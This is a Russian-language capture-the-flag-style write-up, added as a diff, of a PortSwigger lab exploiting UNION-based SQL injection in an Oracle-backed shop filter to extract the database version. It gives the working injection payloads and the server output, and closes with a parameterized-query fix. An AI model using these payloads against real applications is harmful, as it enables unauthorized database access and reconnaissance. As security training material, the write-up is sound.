@@ -1,0 +1,103 @@
+# Название лабораторной
+**Платформа:** PortSwigger Web Security Academy
+**Категория:** SQL Injection
+**Сложность:** Practitioner
+**Дата:** 2025-07-07
+
+---
+
+## TL;DR
+Приложение уязвимо к UNION-based SQL-инъекции. Через запрос к
+специальной таблице Oracle `dual` получили версию базы данных.
+---
+
+## Описание уязвимости
+В Oracle каждый SELECT обязан содержать FROM — в отличие от MySQL
+и PostgreSQL. Для этого используется служебная таблица `dual`.
+Версия базы хранится в `v$version`.
+---
+
+## Разведка
+Приложение — магазин с фильтрацией по категориям.
+Точка входа: параметр `category`.
+
+```http
+GET /filter?category=Gifts HTTP/1.1
+```
+
+Проверяем инъекцию одиночной кавычкой:
+```http
+GET /filter?category=Gifts' HTTP/1.1
+```
+Ответ: 500 Internal Server Error — уязвимость подтверждена.
+---
+
+## Эксплуатация
+
+### Шаг 1 — Определяем количество столбцов
+В Oracle используем `FROM dual` обязательно:
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   ← 500 ошибка
+```
+Вывод: два столбца.
+
+### Шаг 2 — Определяем типы столбцов
+```sql
+' UNION SELECT 'a','b' FROM dual--
+```
+Ответ 200 — оба столбца строковые.
+
+### Шаг 3 — Получаем версию БД
+```sql
+' UNION SELECT BANNER,NULL FROM v$version--
+```
+
+Итоговый запрос:
+```http
+GET /filter?category=Gifts'+UNION+SELECT+BANNER,NULL+FROM+v$version-- HTTP/1.1
+```
+
+Сервер вернул полный вывод таблицы `v$version`:
+
+CORE 11.2.0.2.0 Production
+NLSRTL Version 11.2.0.2.0 - Production
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+PL/SQL Release 11.2.0.2.0 - Production
+TNS for Linux: Version 11.2.0.2.0 - Production
+
+Каждая строка — отдельный компонент Oracle:
+
+| Компонент | Что это |
+|---|---|
+| `CORE` | Ядро БД |
+| `NLSRTL` | Языковая поддержка |
+| `Oracle Database 11g` | Основная версия |
+| `PL/SQL` | Процедурный язык |
+| `TNS` | Сетевой протокол Oracle |
+
+Ключевая строка для атакующего:
+`Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production`
+→ точная версия → можно искать CVE под неё.
+
+## Скриншоты
+![Результат](./images/01-result.png)
+
+---
+
+## Итог
+Получили точную версию Oracle — это даёт атакующему информацию
+для поиска CVE под конкретную версию БД.
+
+---
+
+## Защита
+```python
+# Параметризованный запрос — единственная надёжная защита:
+cursor.execute(
+    "SELECT * FROM products WHERE category = :category",
+    {"category": category}
+)
+# Oracle использует :name синтаксис вместо %s
+```
